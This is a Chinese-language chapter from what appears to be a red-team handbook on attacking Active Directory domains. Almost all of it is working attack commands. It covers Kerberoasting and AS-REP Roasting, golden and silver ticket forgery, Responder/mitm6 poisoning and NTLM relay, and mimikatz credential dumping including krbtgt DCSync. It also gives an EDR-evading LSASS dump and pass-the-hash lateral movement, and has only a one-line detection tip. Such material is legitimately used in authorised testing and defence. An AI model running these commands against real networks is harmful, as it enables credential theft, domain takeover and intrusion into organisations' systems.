## 五、AD 域渗透基础攻击

### 5.1 Kerberos 攻击详解

```bash
# AS-REP Roasting（无需密码的账户，T1558.004）
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes wordlist.txt

# Kerberoasting（SPN 关联账户，T1558.003——2026 年最高频技术）
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.1 -outputfile spn.hashes
# 或用 Rubeus（域内主机）
Rubeus.exe kerberoast /outfile:spn.hashes
hashcat -m 13100 spn.hashes wordlist.txt

# 黄金票据（需要 krbtgt Hash，T1558.001）
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/<EMAIL-REDACTED>

# 白银票据（需要目标服务 Hash，T1558.002）
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-xxx -domain corp.local -spn cifs/dc.corp.local user
# 白银票据只伪造单个服务（如 cifs/spn/ldap），隐蔽性更好

# 委派攻击（非约束/约束/RBCD，T1558.002 变体）见 6.2
```

> **检测提示（防御视角）**：Kerberoasting 最高信号是 Event ID 4769 携带 RC4 加密类型(0x17)；AS-REP Roasting 对应 4768。红队可在报告阶段据此输出检测建议。

### 5.2 NTLM 攻击与投毒

```bash
# LLMNR/NBT-NS/mDNS 投毒（Responder）
responder -I eth0 -dwPv
# IPv6 投毒（mitm6，DNSSEC 环境绕过 LLMNR 关闭场景）
mitm6 -d corp.local
# Inveigh（PowerShell 版，无文件落地）
Invoke-Inveigh -NBNS Y -LLMNR Y -HTTP Y -SMB Y

# SMB Relay（投毒捕获的认证转发到目标，T1557）
# 前提：目标关闭 SMB 签名，且捕获账户具备高权限
ntlmrelayx.py -t smb://10.0.0.5 -smb2support -i    # 交互式 shell
ntlmrelayx.py -t ldap://10.0.0.1 --delegate-access  # 配置 RBCD 后门
# 经典组合：Responder 关 SMB/HTTP + ntlmrelayx
```

### 5.3 凭证访问与内存提取

```bash
# mimikatz（域内主机，T1003.001/002）
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv  # 全量（最后一步）
# pypykatz（Linux 端离线解析 LSASS dump）
pypykatz lsa minidump lsass.dmp

# 免杀取 LSASS（EDR 环境替代 mimikatz 进程内操作，详见第七章）
procdump64.exe -ma lsass.exe lsass.dmp     # 利用签名工具（T1003.001 变体）
# Rubeus dump（票据导出用于 PTT）
Rubeus.exe dump /luid:0x3e7 /service:krbtgt
```

### 5.4 横向移动基础（详见第七章 EDR 对抗深化）

```bash
# PTH（Pass The Hash，T1550.002）
proxychains impacket-psexec -hashes :NT_HASH corp.local/user@10.0.0.5
crackmapexec smb 10.0.0.0/24 -u user -H NT_HASH --exec-method smbexec

# PTT（Pass The Ticket，T1550.003）
export KRB5CCNAME=/tmp/ticket.ccache
proxychains impacket-wmiexec -k -no-pass corp.local/user@10.0.0.5

# WMI / WinRM / DCOM / SCP
proxychains impacket-wmiexec corp.local/user:pass@10.0.0.5
proxychains evil-winrm -i 10.0.0.5 -u user -H NT_HASH
proxychains impacket-dcomexec -hashes :NT_HASH corp.local/user@10.0.0.5

# 批量横向（crackmapexec/netexec）
crackmapexec smb 10.0.0.0/24 -u user -H hash --exec-method wmiexec -x 'whoami'
```

